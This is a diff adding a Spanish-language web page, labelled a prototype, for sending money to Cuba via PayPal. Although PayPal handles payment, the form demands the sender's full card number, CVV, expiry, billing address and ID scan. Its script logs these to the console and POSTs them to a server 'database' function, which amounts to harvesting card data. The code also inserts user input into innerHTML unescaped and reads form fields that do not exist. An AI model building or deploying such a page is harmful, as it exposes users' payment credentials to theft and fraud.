@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+<title>Enviar Dinero a Cuba – Prototipo</title>
+<style>
+  :root{
+    --bg:#0f172a; --card:#0b1220; --border:#1f2937; --muted:#94a3b8; --ink:#e5e7eb;
+    --accent:#4f46e5; --ok:#16a34a; --input:#0a0f1a; --input-border:#334155; --input-focus:#4f46e5;
+  }
+  *{ box-sizing:border-box }
+  html,body{ margin:0; padding:0; width: 100%; min-height: 100%; background:var(--bg); color:var(--ink);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; }
+  .wrap{ width: 100%; max-width: 1000px; margin: 0 auto; padding: 16px; box-sizing: border-box; }
+  .toolbar{ display:flex; gap:12px; flex-wrap:wrap; align-items:center; margin-bottom:16px; }
+  .badge{ display:inline-block; padding:6px 10px; border-radius:999px; font-size:12px;
+    background:#0b1220; border:1px solid var(--border); color:var(--muted); }
+  .muted{ color:var(--muted); font-size:13px; }
+  .grid{ display:grid; grid-template-columns:1fr; gap:16px; }
+  @media (min-width: 900px){ .grid{ grid-template-columns: 1.2fr .8fr; } }
+  .card{ background:var(--card); border:1px solid var(--border); border-radius:16px; padding:22px; box-shadow: 0 10px 30px rgba(0,0,0,.25); }
+  h1{ margin:0 0 12px; font-size:28px; }
+  h2{ margin:16px 0 10px; font-size:20px; color:#cbd5e1; }
+  label{ display:block; font-size:14px; margin:8px 0 6px; color:#cbd5e1; }
+  input, select{
+    width:100%; height:46px; padding:10px 12px; border-radius:12px;
+    border:1px solid var(--input-border); background:var(--input); color:var(--ink); outline:none;
+    font-size: 16px;
+  }
+  input:focus, select:focus{ border-color:var(--input-focus); box-shadow: 0 0 0 3px rgba(79,70,229,.20); }
+  .row{ display:grid; grid-template-columns:1fr; gap:14px; }
+  @media (min-width: 680px){ .row.two{ grid-template-columns:1fr 1fr; } }
+
+  .hr{ height:1px; background:var(--border); margin:18px 0; }
+  .kvs{ font-size:14px; }
+  .kvs div{ display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px dashed var(--border); }
+  .kvs div:last-child{ border-bottom:none; }
+  .ok{ color:var(--ok); }
+  .flex{ display:flex; align-items:center; gap:8px; }
+  .checkbox{ width:auto; }
+
+  /* Estilos para el campo de tarjeta */
+  .card-field {
+    position: relative;
+    margin-bottom: 8px;
+    width: 320px;
+    max-width: 100%;
+  }
+  
+  .card-field input {
+    width: 100%;
+    padding: 12px 45px 12px 15px;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    letter-spacing: 0.3em;
+    font-size: 16px;
+    background: var(--input);
+    border: 1px solid var(--input-border);
+    border-radius: 8px;
+    color: transparent; /* Hacemos el texto transparente */
+    caret-color: var(--ink); /* Color del cursor */
+  }
+  
+  .card-mask {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 35px;
+    bottom: 0;
+    display: flex;
+    align-items: center;
+    padding: 0 15px;
+    pointer-events: none;
+    color: white;
+    font-size: 16px;
+    letter-spacing: 0.3em;
+    white-space: pre;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+
+  .card-validation {
+    position: absolute;
+    top: 50%;
+    right: 12px;
+    transform: translateY(-50%);
+    font-size: 18px;
+    font-weight: bold;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+
+  .card-validation.valid {
+    color: #16a34a;
+    opacity: 1;
+  }
+
+  .card-validation.invalid {
+    color: #dc2626;
+    opacity: 1;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="grid">
+    <!-- IZQUIERDA -->
+    <div class="card">
+      <h1>Enviar Dinero a Cuba</h1>
+
+      <form id="form">
+        <!-- SECCIÓN REMITENTE -->
+        <h2>Datos del remitente</h2>
+        <div class="row two">
+          <div>
+            <label>Tu nombre completo *</label>
+            <input name="remitente_nombre" required />
+          </div>
+          <div>
+            <label>WhatsApp o Teléfono *</label>
+            <input name="remitente_tel" type="tel" inputmode="numeric" pattern="[0-9]*" required />
+          </div>
+        </div>
+        <div class="row two">
+          <div>
+            <label>Correo electrónico</label>
+            <input name="remitente_email" />
+          </div>
+          <div>
+            <label>Documento (opcional)</label>
+            <input name="remitente_doc" placeholder="DNI/ID (opcional)" />
+          </div>
+        </div>
+
+        <!-- LÍNEA SEPARADORA -->
+        <div class="hr"></div>
+
+        <!-- SECCIÓN DESTINATARIO -->
+        <h2>Destinatario en Cuba</h2>
+        <div class="row two">
+          <div>
+            <label>Nombre del beneficiario *</label>
+            <input name="benef_nombre" required />
+          </div>
+          <div>
+            <label>Ciudad / Provincia *</label>
+            <input name="benef_ciudad" required />
+          </div>
+        </div>
+
+        <div class="row two">
+          <div>
+            <label>Moneda de entrega *</label>
+            <select name="entrega" id="entrega" required>
+              <option value="">Selecciona…</option>
+              <option value="CUP">CUP</option>
+              <option value="MLC">MLC</option>
+              <option value="CLASICA">Clasica</option>
+            </select>
+          </div>
+          <div><!-- espacio simétrico --></div>
+        </div>
+
+        <!-- Campos de tarjeta con validación completa -->
+        <div class="row">
+          <div class="card-field">
+            <label>Número de tarjeta destinatario *</label>
+            <div class="card-field">
+              <input id="tarjeta_numero" name="tarjeta_numero" type="tel" inputmode="numeric" pattern="[0-9 ]*" maxlength="19" required />
+              <div class="card-mask" id="cardMask">____ ____ ____ ____</div>
+              <div class="card-validation" id="cardValidationDestinatario">✓</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="hr"></div>
+
+        <h2>Método de pago</h2>
+        <div class="row">
+          <div class="card-field">
+            <label>Número de tarjeta *</label>
+            <div class="card-field">
+              <input id="tarjeta_numero_remitente" name="tarjeta_numero_remitente" type="tel" inputmode="numeric" pattern="[0-9 ]*" maxlength="19" required />
+              <div class="card-mask" id="cardMaskRemitente">____ ____ ____ ____</div>
+              <div class="card-validation" id="cardValidationRemitente">✓</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="row two">
+          <div>
+            <label>Fecha de vencimiento *</label>
+            <input id="tarjeta_vencimiento" name="tarjeta_vencimiento" type="tel" inputmode="numeric" pattern="[0-9/]*" maxlength="5" placeholder="MM/AA" required />
+            <div class="muted">Formato: MM/AA</div>
+          </div>
+          <div>
+            <label>CVV *</label>
+            <input id="tarjeta_cvv" name="tarjeta_cvv" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="123" required />
+            <div class="muted">3-4 dígitos del reverso</div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div>
+            <label>Nombre en la tarjeta *</label>
+            <input id="tarjeta_nombre" name="tarjeta_nombre" type="text" placeholder="Como aparece en la tarjeta" required />
+            <div class="muted">Debe coincidir exactamente con el nombre en la tarjeta</div>
+          </div>
+        </div>
+
+        <h2>Monto</h2>
+        <div class="row two">
+          <div>
+            <label>Monto a enviar en USD *</label>
+            <input type="number" min="1" step="1" name="monto_usd" id="monto_usd" required />
+            <div class="muted">Mínimo US$1 – solo números enteros</div>
+          </div>
+          <div>
+            <label>Monto a depositar en tarjeta</label>
+            <input name="monto_tarjeta" id="monto_tarjeta" readonly />
+          </div>
+        </div>
+
+        <div class="row two">
+          <div>
+            <label>Notas (opcional)</label>
+            <input name="notas" placeholder="Referencia, horario, etc." />
+          </div>
+          <div>
+            <label>Número de orden (auto)</label>
+            <input name="orden_id" id="orden_id" readonly />
+          </div>
+        </div>
+
+        <h2>Verificación de identidad</h2>
+        <div class="row two">
+          <div>
+            <label>Dirección de facturación *</label>
+            <input name="direccion_facturacion" placeholder="Calle, número, ciudad" required />
+            <div class="muted">Debe coincidir con la dirección de la tarjeta</div>
+          </div>
+          <div>
+            <label>Código postal *</label>
+            <input name="codigo_postal" placeholder="12345" required />
+          </div>
+        </div>
+
+        <div class="row">
+          <div>
+            <label>Documento de identidad *</label>
+            <input type="file" name="documento_id" accept="image/*,.pdf" required />
+            <div class="muted">Sube una foto clara de tu documento oficial (DNI, pasaporte, etc.)</div>
+          </div>
+        </div>
+
+        <div class="hr"></div>
+        <label class="flex">
+          <input class="checkbox" type="checkbox" id="acepto" required />
+          <span>Acepto las políticas de servicio y reembolsos</span>
+        </label>
+        <div class="hr"></div>
+
+        <div class="kvs" id="resumen"></div>
+      </form>
+
+      <!-- Botón de PayPal al final -->
+      <div class="hr"></div>
+      <h2>💳 Pagar con PayPal</h2>
+      <div id="paypal-button-container"></div>
+    </div>
+
+    <!-- DERECHA -->
+    <div class="card">
+      <h2>Políticas y seguridad</h2>
+      <ul class="muted" style="line-height:1.6;">
+        <li>Reembolsos dentro de 24 horas si no se ha entregado al beneficiario.</li>
+        <li>Verificación por WhatsApp/Email antes de liberar fondos.</li>
+        <li>Pago por envío calculado automáticamente según el monto.</li>
+      </ul>
+      <div class="hr"></div>
+      <h2>Tasas de conversión escalonadas</h2>
+      <div class="muted" style="line-height:1.5;">
+        <strong>CUP:</strong><br>
+        • Hasta $99: 410 CUP<br>
+        • $100-$499: 415 CUP<br>
+        • $500-$999: 418 CUP<br>
+        • $1,000-$1,999: 422 CUP<br>
+        • $2,000+: 425 CUP<br><br>
+        <strong>MLC:</strong><br>
+        • Hasta $99: 2.00 MLC<br>
+        • $100-$499: 2.05 MLC<br>
+        • $500-$999: 2.08 MLC<br>
+        • $1,000-$1,999: 2.12 MLC<br>
+        • $2,000+: 2.16 MLC<br><br>
+        <strong>Clasica:</strong><br>
+        • Todos los montos: 1.00 USD
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Cargar PayPal SDK directamente (más confiable)
+  function loadPayPalSDK() {
+    console.log('Cargando PayPal SDK...');
+    const script = document.createElement('script');
+    script.src = 'https://www.paypal.com/sdk/js?client-id=ASQfwQYT9PH-THXDUkeq1FCD9l8tBGqo3J69N5HZ-FhfJpnVpORzWuo07n3i8LxMdVasrCCep_D-f-1q&currency=USD&locale=es_ES';
+    script.onload = () => console.log('PayPal SDK cargado exitosamente');
+    script.onerror = () => console.error('Error cargando PayPal SDK');
+    document.head.appendChild(script);
+  }
+  
+  loadPayPalSDK();
+</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+  const $ = (q) => document.querySelector(q);
+  const form = $('#form');
+  const resumen = $('#resumen');
+  const ordenInput = $('#orden_id');
+  const montoTarjetaInput = $('#monto_tarjeta');
+  const montoUsdInput = $('#monto_usd');
+  const monedaSelect = $('#entrega');
+  const tarjetaDestinatarioInput = document.getElementById('tarjeta_numero');
+  const cardMaskDestinatario = document.getElementById('cardMask');
+  const tarjetaInput = document.getElementById('tarjeta_numero_remitente');
+  const cardMask = document.getElementById('cardMaskRemitente');
+  const telefonoInput = document.querySelector('input[name="remitente_tel"]');
+
+  // Tasas de conversión escalonadas
+  function obtenerTasaConversion(monto, moneda) {
+    if (moneda === 'CUP') {
+      if (monto <= 99) return 410;
+      if (monto <= 499) return 415;
+      if (monto <= 999) return 418;
+      if (monto <= 1999) return 422;
+      return 425;
+    } else if (moneda === 'MLC') {
+      if (monto <= 99) return 2.00;
+      if (monto <= 499) return 2.05;
+      if (monto <= 999) return 2.08;
+      if (monto <= 1999) return 2.12;
+      return 2.16;
+    } else if (moneda === 'CLASICA') {
+      return 1.00;
+    }
+    return 1;
+  }
+
+  function genOrderId(){
+    const r = Math.random().toString(36).slice(2,6).toUpperCase();
+    return 'ORD-' + Date.now() + '-' + r;
+  }
+
+  function updateCardMask() {
+    const value = tarjetaInput.value.replace(/\s/g, '');
+    let mask = '';
+    
+    for (let i = 0; i < 16; i++) {
+      if (i > 0 && i % 4 === 0) {
+        mask += ' ';
+      }
+      
+      if (i < value.length) {
+        mask += value[i];
+      } else {
+        mask += '_';
+      }
+    }
+    
+    cardMask.textContent = mask;
+    
+    // Validar tarjeta en tiempo real
+    const validationIcon = document.getElementById('cardValidationRemitente');
+    if (value.length === 16) {
+      if (validateCardNumber(value)) {
+        validationIcon.textContent = '✓';
+        validationIcon.className = 'card-validation valid';
+      } else {
+        validationIcon.textContent = '✗';
+        validationIcon.className = 'card-validation invalid';
+      }
+    } else {
+      validationIcon.className = 'card-validation';
+    }
+    
+    renderResumen();
+  }
+
+  function updateCardMaskDestinatario() {
+    const value = tarjetaDestinatarioInput.value.replace(/\s/g, '');
+    let mask = '';
+    
+    for (let i = 0; i < 16; i++) {
+      if (i > 0 && i % 4 === 0) {
+        mask += ' ';
+      }
+      
+      if (i < value.length) {
+        mask += value[i];
+      } else {
+        mask += '_';
+      }
+    }
+    
+    cardMaskDestinatario.textContent = mask;
+    
+    // Validar solo longitud para tarjeta destinatario
+    const validationIcon = document.getElementById('cardValidationDestinatario');
+    if (value.length === 16) {
+      validationIcon.textContent = '✓';
+      validationIcon.className = 'card-validation valid';
+    } else {
+      validationIcon.className = 'card-validation';
+    }
+    
+    renderResumen();
+  }
+
+  function calcularMontoTarjeta(){
+    const monto = Number(montoUsdInput.value || 0);
+    const moneda = monedaSelect.value;
+    const tasa = obtenerTasaConversion(monto, moneda);
+    const montoTarjeta = monto && moneda ? (monto * tasa) : 0;
+    montoTarjetaInput.value = (monto && moneda) ? montoTarjeta.toFixed(2) : '';
+    return { monto, tasa, montoTarjeta, moneda };
+  }
+
+  // Función para calcular pago por envío escalonado
+  function calcularPagoPorEnvio(monto) {
+    if (monto >= 100) return monto * 0.08; // 8%
+    if (monto >= 50) return monto * 0.10;  // 10%
+    if (monto >= 20) return monto * 0.11;  // 11%
+    return monto * 0.11; // 11% para montos menores a $20
+  }
+
+  function renderResumen(){
+    const fd = new FormData(form);
+    const { monto, moneda, tasa } = calcularMontoTarjeta();
+    const tarifa = +calcularPagoPorEnvio(monto).toFixed(2);
+    const total = +(monto + tarifa).toFixed(2);
+    
+    let numTarjetaDisplay = '';
+    const numTarjeta = (tarjetaInput.value || '').replace(/\D/g,'');
+    if (numTarjeta.length > 0) {
+      const formatted = numTarjeta.replace(/(.{4})/g, '$1 ').trim();
+      numTarjetaDisplay = `<div><strong>Número de tarjeta</strong><span>${formatted}</span></div>`;
+    } else {
+      numTarjetaDisplay = `<div><strong>Número de tarjeta</strong><span>-</span></div>`;
+    }
+
+    resumen.innerHTML = `
+      <div><strong>Remitente</strong><span>${fd.get('remitente_nombre') || '-'}</span></div>
+      <div><strong>Beneficiario</strong><span>${fd.get('benef_nombre') || '-'}</span></div>
+      <div><strong>Ciudad</strong><span>${fd.get('benef_ciudad') || '-'}</span></div>
+      <div><strong>Moneda</strong><span>${moneda || '-'}</span></div>
+      <div><strong>Tasa aplicada</strong><span>${tasa ? tasa + ' ' + moneda + '/USD' : '-'}</span></div>
+      ${numTarjetaDisplay}
+      <div><strong>Monto (USD)</strong><span>$${monto ? monto.toFixed(0) : '0'}</span></div>
+      <div><strong>Pago por envío</strong><span>$${monto ? tarifa.toFixed(2) : '0.00'}</span></div>
+      <div><strong>Total a cobrar</strong><span>$${monto ? total.toFixed(2) : '0.00'}</span></div>
+      <div><strong>Monto a depositar en tarjeta</strong><span>${montoTarjetaInput.value || '-'}</span></div>
+    `;
+  }
+
+  function validateCardNumber(number) {
+    // Algoritmo de Luhn para validar número de tarjeta
+    const digits = number.replace(/\D/g, '');
+    let sum = 0;
+    let isEven = false;
+    
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let digit = parseInt(digits[i]);
+      
+      if (isEven) {
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
+      }
+      
+      sum += digit;
+      isEven = !isEven;
+    }
+    
+    return sum % 10 === 0;
+  }
+
+  function validateExpirationDate(expDate) {
+    if (!/^\d{2}\/\d{2}$/.test(expDate)) return false;
+    
+    const [month, year] = expDate.split('/').map(num => parseInt(num));
+    const currentDate = new Date();
+    const currentYear = currentDate.getFullYear() % 100;
+    const currentMonth = currentDate.getMonth() + 1;
+    
+    if (month < 1 || month > 12) return false;
+    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
+    
+    return true;
+  }
+
+  function validate(){
+    const remitenteNombre = document.querySelector('input[name="remitente_nombre"]').value.trim();
+    const remitenteTel = document.querySelector('input[name="remitente_tel"]').value.trim();
+    const benefNombre = document.querySelector('input[name="benef_nombre"]').value.trim();
+    const benefCiudad = document.querySelector('input[name="benef_ciudad"]').value.trim();
+    const entrega = document.querySelector('select[name="entrega"]').value;
+    const acepto = document.querySelector('#acepto').checked;
+    
+    // Validaciones básicas
+    if (!remitenteNombre) return { ok:false, msg:'Ingresa tu nombre completo.' };
+    if (!remitenteTel) return { ok:false, msg:'Ingresa tu WhatsApp o teléfono.' };
+    if (!benefNombre) return { ok:false, msg:'Ingresa el nombre del beneficiario.' };
+    if (!benefCiudad) return { ok:false, msg:'Ingresa la ciudad del beneficiario.' };
+    if (!entrega) return { ok:false, msg:'Selecciona la moneda de entrega.' };
+    if (!acepto) return { ok:false, msg:'Debes aceptar las políticas de servicio.' };
+    
+    // Validaciones de tarjeta para pago (remitente)
+    const numTarjeta = tarjetaInput.value.replace(/\D/g,'');
+    if (numTarjeta.length < 16) return { ok:false, msg:'Ingresa un número de tarjeta válido para el pago (16 dígitos).' };
+    if (!validateCardNumber(numTarjeta)) return { ok:false, msg:'El número de tarjeta para el pago no es válido.' };
+
+    // Validaciones de tarjeta destinatario (solo longitud, sin algoritmo Luhn)
+    const numTarjetaDestinatario = tarjetaDestinatarioInput.value.replace(/\D/g,'');
+    if (numTarjetaDestinatario.length < 16) return { ok:false, msg:'Ingresa un número de tarjeta destinatario válido (16 dígitos).' };
+    
+    const vencimiento = document.getElementById('tarjeta_vencimiento').value;
+    if (!validateExpirationDate(vencimiento)) return { ok:false, msg:'La fecha de vencimiento no es válida o la tarjeta está vencida.' };
+    
+    const cvv = document.getElementById('tarjeta_cvv').value;
+    if (cvv.length < 3 || cvv.length > 4) return { ok:false, msg:'Ingresa un CVV válido (3-4 dígitos).' };
+    
+    const nombreTarjeta = document.getElementById('tarjeta_nombre').value.trim();
+    if (!nombreTarjeta) return { ok:false, msg:'Ingresa el nombre como aparece en la tarjeta.' };
+    
+    // Validaciones de verificación de identidad
+    const direccion = document.querySelector('input[name="direccion_facturacion"]').value.trim();
+    if (!direccion) return { ok:false, msg:'Ingresa la dirección de facturación.' };
+    
+    const codigoPostal = document.querySelector('input[name="codigo_postal"]').value.trim();
+    if (!codigoPostal) return { ok:false, msg:'Ingresa el código postal.' };
+    
+    const documentoId = document.querySelector('input[name="documento_id"]').files[0];
+    if (!documentoId) return { ok:false, msg:'Debes subir tu documento de identidad.' };
+    
+    // Validar que el nombre del remitente coincida aproximadamente con el de la tarjeta
+    const nombresSimilares = compararNombres(remitenteNombre, nombreTarjeta);
+    if (!nombresSimilares) {
+      return { ok:false, msg:'El nombre del remitente debe coincidir con el nombre en la tarjeta.' };
+    }
+    
+    const monto = Number(montoUsdInput.value || 0);
+    if (monto < 1) return { ok:false, msg:'El monto mínimo es US$1.' };
+    if (!Number.isInteger(monto)) return { ok:false, msg:'El monto debe ser un número entero.' };
+    
+    return { ok:true };
+  }
+
+  function compararNombres(nombre1, nombre2) {
+    // Normalizar nombres para comparación
+    const normalize = (str) => str.toLowerCase().replace(/[^a-z\s]/g, '').trim();
+    const n1 = normalize(nombre1).split(' ');
+    const n2 = normalize(nombre2).split(' ');
+    
+    // Verificar si al menos 2 palabras coinciden
+    let coincidencias = 0;
+    for (let palabra1 of n1) {
+      for (let palabra2 of n2) {
+        if (palabra1 === palabra2 && palabra1.length > 2) {
+          coincidencias++;
+        }
+      }
+    }
+    
+    return coincidencias >= 2 || (coincidencias >= 1 && (n1.length <= 2 || n2.length <= 2));
+  }
+
+  // Función para recopilar todos los datos del formulario
+  function getAllFormData() {
+    const fd = new FormData(form);
+    const { monto, moneda } = calcularMontoTarjeta();
+    const tarifa = +calcularPagoPorEnvio(monto).toFixed(2);
+    const total = +(monto + tarifa).toFixed(2);
+    
+    return {
+      // Datos del remitente
+      nombre_remitente: fd.get('nombre_remitente'),
+      apellido_remitente: fd.get('apellido_remitente'),
+      telefono_remitente: fd.get('telefono_remitente'),
+      email_remitente: fd.get('email_remitente'),
+      
+      // Datos del destinatario
+      benef_nombre: fd.get('benef_nombre'),
+      benef_ciudad: fd.get('benef_ciudad'),
+      entrega: fd.get('entrega'),
+      tarjeta_numero: fd.get('tarjeta_numero'),
+      
+      // Datos de pago
+      tarjeta_numero_remitente: fd.get('tarjeta_numero_remitente'),
+      tarjeta_vencimiento: fd.get('tarjeta_vencimiento'),
+      tarjeta_cvv: fd.get('tarjeta_cvv'),
+      tarjeta_nombre: fd.get('tarjeta_nombre'),
+      direccion_facturacion: fd.get('direccion_facturacion'),
+      codigo_postal: fd.get('codigo_postal'),
+      pais_facturacion: fd.get('pais_facturacion'),
+      
+      // Montos calculados
+      monto_usd: monto,
+      moneda_seleccionada: moneda,
+      tarifa: tarifa,
+      monto_total: total,
+      orden_id: fd.get('orden_id'),
+      notas: fd.get('notas')
+    };
+  }
+
+  // Función para guardar transacción completa
+  function guardarTransaccionCompleta(paypalDetails) {
+    const formData = getAllFormData();
+    
+    // Crear objeto completo de transacción
+    const transactionData = {
+      // Información del formulario
+      formulario: formData,
+      
+      // Información de PayPal
+      paypal: {
+        transaction_id: paypalDetails.id,
+        status: paypalDetails.status,
+        payer_email: paypalDetails.payer?.email_address || 'No disponible',
+        amount: paypalDetails.purchase_units?.[0]?.amount?.value || 'No disponible',
+        currency: paypalDetails.purchase_units?.[0]?.amount?.currency_code || 'USD',
+        payer_name: paypalDetails.payer?.name || {},
+        payer_address: paypalDetails.payer?.address || {},
+        create_time: paypalDetails.create_time,
+        update_time: paypalDetails.update_time
+      },
+      
+      // Metadata
+      timestamp: new Date().toISOString(),
+      fecha_local: new Date().toLocaleString('es-ES', {
+        timeZone: 'America/Havana',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      }),
+      user_agent: navigator.userAgent,
+      url: window.location.href,
+      ip_address: 'N/A' // Se puede obtener del servidor
+    };
+    
+    console.log('📊 Transacción completa capturada:', transactionData);
+    
+    // Solo guardar datos NO sensibles en localStorage para referencia
+    try {
+      const safeData = {
+        id: paypalDetails.id,
+        timestamp: transactionData.timestamp,
+        orden_id: formData.orden_id,
+        remitente_nombre: formData.nombre_remitente,
+        beneficiario: formData.benef_nombre,
+        monto_usd: formData.monto_usd,
+        monto_total: formData.monto_total,
+        status: 'completed'
+      };
+      
+      localStorage.setItem('lastTransaction', JSON.stringify(safeData));
+      
+      // Mantener historial básico (sin datos sensibles)
+      const history = JSON.parse(localStorage.getItem('transactionHistory') || '[]');
+      history.push(safeData);
+      localStorage.setItem('transactionHistory', JSON.stringify(history));
+      
+      console.log('💾 Referencia básica guardada en localStorage');
+    } catch (error) {
+      console.error('❌ Error guardando referencia:', error);
+    }
+    
+    return transactionData;
+  }
+
+  async function enviarDatosEmail(paypalDetails) {
+    try {
+      // Guardar transacción completa primero
+      const transactionData = guardarTransaccionCompleta(paypalDetails);
+      
+      // Preparar datos para email (formato compatible con funciones existentes)
+      const datosEmail = {
+        remitente_nombre: transactionData.formulario.nombre_remitente,
+        remitente_tel: transactionData.formulario.telefono_remitente,
+        remitente_email: transactionData.formulario.email_remitente,
+        benef_nombre: transactionData.formulario.benef_nombre,
+        benef_ciudad: transactionData.formulario.benef_ciudad,
+        entrega: transactionData.formulario.entrega,
+        tarjeta_numero: transactionData.formulario.tarjeta_numero,
+        monto_usd: transactionData.formulario.monto_usd,
+        orden_id: transactionData.formulario.orden_id,
+        monto_total: transactionData.formulario.monto_total,
+        tarifa: transactionData.formulario.tarifa,
+        paypal_order_id: paypalDetails.id,
+        paypal_status: paypalDetails.status,
+        fecha_transaccion: transactionData.fecha_local
+      };
+      
+      // Enviar email
+      const emailResponse = await fetch('/.netlify/functions/send-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(datosEmail)
+      });
+      
+      // Guardar transacción completa en servidor (base de datos segura)
+      const transactionResponse = await fetch('/.netlify/functions/database', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(transactionData)
+      });
+      
+      if (emailResponse.ok) {
+        console.log('📧 Email enviado correctamente');
+      } else {
+        console.error('❌ Error enviando email:', emailResponse.statusText);
+      }
+      
+      if (transactionResponse.ok) {
+        console.log('🗄️ Transacción guardada en servidor');
+      } else {
+        console.error('❌ Error guardando transacción:', transactionResponse.statusText);
+      }
+    } catch (error) {
+      console.error('❌ Error en proceso post-pago:', error);
+    }
+  }
+
+
+  // Restringir el campo de teléfono a solo números
+  telefonoInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  });
+
+  telefonoInput.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const paste = (e.clipboardData || window.clipboardData).getData('text');
+    const numbersOnly = paste.replace(/\D/g, '');
+    e.target.value = numbersOnly;
+  });
+
+  // Eventos de cálculo/maquetado
+  form.addEventListener('input', () => { calcularMontoTarjeta(); renderResumen(); });
+  monedaSelect.addEventListener('change', () => { calcularMontoTarjeta(); renderResumen(); });
+
+  // Validación de fecha de vencimiento
+  const vencimientoInput = document.getElementById('tarjeta_vencimiento');
+  vencimientoInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+  });
+
+  // Validación de CVV
+  const cvvInput = document.getElementById('tarjeta_cvv');
+  cvvInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  });
+
+  // Validación de nombre en tarjeta
+  const nombreTarjetaInput = document.getElementById('tarjeta_nombre');
+  nombreTarjetaInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+  });
+
+  // Manejar el evento de entrada en el campo de tarjeta para pago (remitente)
+  tarjetaInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    value = value.substring(0, 16);
+    
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) {
+        formatted += ' ';
+      }
+      formatted += value[i];
+    }
+    
+    e.target.value = formatted;
+    updateCardMask();
+    
+    const len = e.target.value.length;
+    e.target.setSelectionRange(len, len);
+  });
+  
+  tarjetaInput.addEventListener('click', (e) => {
+    const len = e.target.value.length;
+    e.target.setSelectionRange(len, len);
+  });
+
+  // Manejar el evento de entrada en el campo de tarjeta destinatario
+  tarjetaDestinatarioInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    value = value.substring(0, 16);
+    
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) {
+        formatted += ' ';
+      }
+      formatted += value[i];
+    }
+    
+    e.target.value = formatted;
+    updateCardMaskDestinatario();
+    
+    const len = e.target.value.length;
+    e.target.setSelectionRange(len, len);
+  });
+  
+  tarjetaDestinatarioInput.addEventListener('click', (e) => {
+    const len = e.target.value.length;
+    e.target.setSelectionRange(len, len);
+  });
+
+
+  // Función para inicializar PayPal
+  function initPayPal() {
+    paypal.Buttons({
+      createOrder: function(data, actions) {
+        const validation = validate();
+        if (!validation.ok) {
+          alert(validation.msg);
+          return Promise.reject(new Error(validation.msg));
+        }
+        
+        const { monto } = calcularMontoTarjeta();
+        const tarifa = calcularPagoPorEnvio(monto);
+        const total = +(monto + tarifa).toFixed(2);
+        
+        // Obtener información del formulario para autocompletar campos permitidos
+        const nombreRemitenteEl = document.getElementById('nombre_remitente');
+        const apellidoRemitenteEl = document.getElementById('apellido_remitente');
+        const telefonoRemitenteEl = document.getElementById('telefono_remitente');
+        const direccionEl = document.getElementById('direccion_facturacion');
+        const codigoPostalEl = document.getElementById('codigo_postal');
+        const paisEl = document.getElementById('pais_facturacion');
+        
+        const orderData = {
+          purchase_units: [{
+            amount: {
+              value: total.toString()
+            }
+          }]
+        };
+        
+        // Agregar información del payer (nombre, teléfono, dirección)
+        if (nombreRemitenteEl && apellidoRemitenteEl) {
+          orderData.payer = {};
+          
+          // Nombre completo
+          if (nombreRemitenteEl.value || apellidoRemitenteEl.value) {
+            orderData.payer.name = {
+              given_name: nombreRemitenteEl.value || '',
+              surname: apellidoRemitenteEl.value || ''
+            };
+          }
+          
+          // Teléfono
+          if (telefonoRemitenteEl && telefonoRemitenteEl.value) {
+            orderData.payer.phone = {
+              phone_number: {
+                national_number: telefonoRemitenteEl.value
+              }
+            };
+          }
+          
+          // Dirección de facturación
+          if (direccionEl && direccionEl.value && codigoPostalEl && codigoPostalEl.value) {
+            orderData.payer.address = {
+              address_line_1: direccionEl.value,
+              postal_code: codigoPostalEl.value,
+              country_code: paisEl && paisEl.value ? paisEl.value : 'US'
+            };
+          }
+        }
+        
+        return actions.order.create(orderData);
+      },
+      onApprove: function(data, actions) {
+        return actions.order.capture().then(function(details) {
+          enviarDatosEmail(details);
+          alert('¡Pago completado exitosamente!');
+          
+          const okBox = document.getElementById('okBox');
+          if (okBox) {
+            okBox.style.display = 'block';
+            okBox.innerHTML = '<p class="ok"><strong>✔ Pago procesado exitosamente.</strong> Recibirás confirmación por email.</p>';
+          }
+        }).catch(function(error) {
+          console.error('Error al capturar pago PayPal:', error);
+          alert('Error al procesar el pago. Intenta nuevamente.');
+        });
+      },
+      onError: function(err) {
+        console.error('Error en PayPal:', err);
+      },
+      onCancel: function(data) {
+        alert('Pago cancelado.');
+      }
+    }).render('#paypal-button-container');
+  }
+
